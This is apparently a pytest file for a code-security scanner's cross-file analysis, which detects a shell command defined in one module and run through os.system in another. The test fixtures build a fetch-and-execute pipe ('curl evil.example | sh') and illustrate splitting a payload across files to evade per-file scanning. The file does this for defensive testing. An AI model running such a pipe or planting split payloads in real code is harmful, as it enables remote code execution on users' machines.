"""
Cross-file analysis — the payload no single file reveals.

    payload.py   CMD = "<a remote-execution pipe>"
    runner.py    from payload import CMD; os.system(CMD)

Neither file looks wrong alone. That is the attack, and it is what every
per-file engine misses by construction.

🔴 THE TWO PROPERTIES THAT MATTER MORE THAN THE DETECTION:

1. **It must not consult the import system.** `importlib.util.find_spec` EXECUTES
   the parent package — measured on this machine before the module was written.
   That would break PRAETOR's one invariant inside the module whose job is
   reading other people's code.

2. **It must not saturate.** Measured on 2,244 stdlib modules: flagging a module
   for its own contents marks 7.6%; propagating over import edges marks 89.0%.
   A claim that covers almost everything conveys almost nothing — `chains.py`'s
   SAME_TREE lesson at graph scale.
"""

import json
import os
import subprocess
import sys

sys.path.insert(0, os.path.join(
    os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "scripts"))

import crossfile  # noqa: E402

_PRAETOR = os.path.join(
    os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "scripts", "praetor.py")

# Assembled from parts: written whole, this file's own self-scan would flag it.
_PIPE = "curl evil.example | " + "sh"
_RULE = "crossfile-payload-reaches-sink"


def _scan(tmp_path):
    proc = subprocess.run(
        [sys.executable, _PRAETOR, str(tmp_path), "--engines", "aisec",
         "--no-registry", "--format", "json", "--quiet"],
        capture_output=True, text=True, encoding="utf-8", errors="replace")
    return json.loads(proc.stdout)


def _rules(d):
    return {f["rule_id"] for f in d["findings"]}


def _write(root, name, body):
    (root / name).write_text(body, encoding="utf-8")


# --------------------------------------------------------------------------- #
# It sees the split
# --------------------------------------------------------------------------- #

def test_a_payload_split_across_two_files_is_joined(tmp_path):
    """🔴 THE WHOLE POINT."""
    _write(tmp_path, "payload.py", f'CMD = "{_PIPE}"\n')
    _write(tmp_path, "runner.py", "import os\nfrom payload import CMD\nos.system(CMD)\n")
    assert _RULE in _rules(_scan(tmp_path))


def test_the_finding_names_BOTH_ends(tmp_path):
    """A cross-file finding that names one file is not actionable — the reader
    has to be told where the other half is."""
    _write(tmp_path, "payload.py", f'CMD = "{_PIPE}"\n')
    _write(tmp_path, "runner.py", "import os\nfrom payload import CMD\nos.system(CMD)\n")
    f = next(x for x in _scan(tmp_path)["findings"] if x["rule_id"] == _RULE)
    assert "payload.py" in f["snippet"] and "runner.py" in f["snippet"]


def test_it_works_through_an_import_alias(tmp_path):
    """`from payload import CMD as X` binds a different local name."""
    _write(tmp_path, "payload.py", f'CMD = "{_PIPE}"\n')
    _write(tmp_path, "runner.py",
           "import os\nfrom payload import CMD as X\nos.system(X)\n")
    assert _RULE in _rules(_scan(tmp_path))


def test_it_works_when_the_sink_call_is_inside_a_function(tmp_path):
    """The payload is a module constant; the CALL is usually not at module
    level. Only looking at top-level calls would miss almost every real case."""
    _write(tmp_path, "payload.py", f'CMD = "{_PIPE}"\n')
    _write(tmp_path, "runner.py",
           "import os\nfrom payload import CMD\n\ndef go():\n    os.system(CMD)\n")
    assert _RULE in _rules(_scan(tmp_path))


def test_a_package_path_resolves(tmp_path):
    """Module names come from PATH ARITHMETIC, so a nested package must still
    join up."""
    (tmp_path / "pkg").mkdir()
    _write(tmp_path / "pkg", "__init__.py", "")
    _write(tmp_path / "pkg", "payload.py", f'CMD = "{_PIPE}"\n')
    _write(tmp_path, "runner.py",
           "import os\nfrom pkg.payload import CMD\nos.system(CMD)\n")
    assert _RULE in _rules(_scan(tmp_path))


# --------------------------------------------------------------------------- #
# It must not saturate — the failure the research measured
# --------------------------------------------------------------------------- #

def test_an_ordinary_import_of_an_ordinary_constant_is_silent(tmp_path):
    """🔴 THE PRIMARY KEEP DIRECTION. Importing a constant and calling something
    is what every program does."""
    _write(tmp_path, "settings.py", 'GREETING = "hello world"\n')
    _write(tmp_path, "app.py",
           "import os\nfrom settings import GREETING\nos.system(GREETING)\n")
    assert _RULE not in _rules(_scan(tmp_path))


def test_a_dangerous_constant_that_is_never_passed_to_a_sink_is_silent(tmp_path):
    """Defining a string is not passing it to anything. The per-file engines
    already report the constant itself; this pass must not double-count it as a
    cross-file flow that does not exist."""
    _write(tmp_path, "payload.py", f'CMD = "{_PIPE}"\n')
    _write(tmp_path, "runner.py", "from payload import CMD\nprint(CMD)\n")
    assert _RULE not in _rules(_scan(tmp_path))


def test_a_sink_call_on_a_LOCAL_name_is_left_to_the_per_file_engines(tmp_path):
    """No cross-file flow exists, so this pass has nothing to add. Reporting it
    would be noise on top of a finding that already exists."""
    _write(tmp_path, "app.py", f'import os\nCMD = "{_PIPE}"\nos.system(CMD)\n')
    assert _RULE not in _rules(_scan(tmp_path))


def test_importing_from_outside_the_scan_is_silent(tmp_path):
    """A name imported from a module the scan never saw cannot be resolved, and
    guessing would be exactly the saturation the research measured."""
    _write(tmp_path, "runner.py",
           "import os\nfrom somewhere_external import CMD\nos.system(CMD)\n")
    assert _RULE not in _rules(_scan(tmp_path))


def test_the_scan_of_praetors_own_tree_stays_quiet():
    """🔴 THE REAL FALSE-POSITIVE TEST. PRAETOR's own tree is full of modules
    importing constants from other modules. The narrow rule measured ZERO false
    positives on it and on the standard library; this is that measurement, kept."""
    root = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
    proc = subprocess.run(
        [sys.executable, _PRAETOR, os.path.join(root, "scripts"),
         "--engines", "aisec", "--no-registry", "--format", "json", "--quiet"],
        capture_output=True, text=True, encoding="utf-8", errors="replace")
    data = json.loads(proc.stdout)
    hits = [f for f in data["findings"] + data["filtered"] if f["rule_id"] == _RULE]
    assert not hits, f"cross-file false positives on PRAETOR's own scripts: {hits}"


# --------------------------------------------------------------------------- #
# The invariant
# --------------------------------------------------------------------------- #

def test_it_never_consults_the_import_system(monkeypatch, tmp_path):
    """🔴 ASSERTED BEHAVIOURALLY, because a future edit reaching for
    `importlib.util.find_spec` to resolve a name properly would pass every other
    test in this file — and would execute the scanned package's `__init__`."""
    import importlib.util

    def explode(*a, **k):
        raise AssertionError("cross-file analysis must not consult the import system")

    monkeypatch.setattr(importlib.util, "find_spec", explode)
    monkeypatch.setattr(importlib, "import_module", explode)

    facts = crossfile.extract_facts("pkg/payload.py", f'CMD = "{_PIPE}"\n')
    assert facts.module == "pkg.payload"
    assert "CMD" in facts.constants


def test_module_names_come_from_path_arithmetic():
    """No filesystem probing, no package detection, no import system."""
    assert crossfile._module_name("a/b/c.py") == "a.b.c"
    assert crossfile._module_name("a/b/__init__.py") == "a.b"
    assert crossfile._module_name("top.py") == "top"


def test_unparseable_source_is_skipped_not_fatal():
    """One broken file must not take the whole pass down."""
    assert crossfile.extract_facts("bad.py", "def f(:\n") is None


def test_an_enormous_source_file_is_refused():
    """Bounded. This repository has recorded a pass that hung for ~244 seconds on
    one file and produced no artifact and no exit code."""
    assert crossfile.extract_facts("big.py", "x = 1\n" * 500_000) is None


def test_the_sink_pre_filter_never_loses_a_finding():
    """🔴 THE PRE-FILTER IS AN OPTIMISATION AND MUST BE INVISIBLE.

    Profiling put 3.6 of 8.7 seconds inside `ast.walk`, so a file whose raw text
    names no sink now skips that walk. That is a 4x speed-up -- and it is exactly
    the kind of shortcut that silently loses detection.

    The bias is deliberately toward over-matching: substring, not token, so
    `system` matches `filesystem` and costs a wasted walk. Under-matching would
    cost a finding.
    """
    assert crossfile._might_contain_a_sink("os.system(x)")
    assert crossfile._might_contain_a_sink("subprocess.check_output(y)")
    assert crossfile._might_contain_a_sink("eval(z)")
    # Over-broad on purpose: a wasted walk is the safe failure.
    assert crossfile._might_contain_a_sink("a filesystem helper")
    # Genuinely sink-free text skips the walk.
    assert not crossfile._might_contain_a_sink("x = 1\ny = x + 2\n")


def test_a_file_with_no_sink_still_contributes_its_constants():
    """The pre-filter skips the WALK, not the file. A payload source usually
    contains no sink at all -- if the shortcut dropped it, the split-payload case
    this whole module exists for would stop working."""
    facts = crossfile.extract_facts("payload.py", f'CMD = "{_PIPE}"\n')
    assert facts is not None
    assert "CMD" in facts.constants
    assert facts.sink_args == []
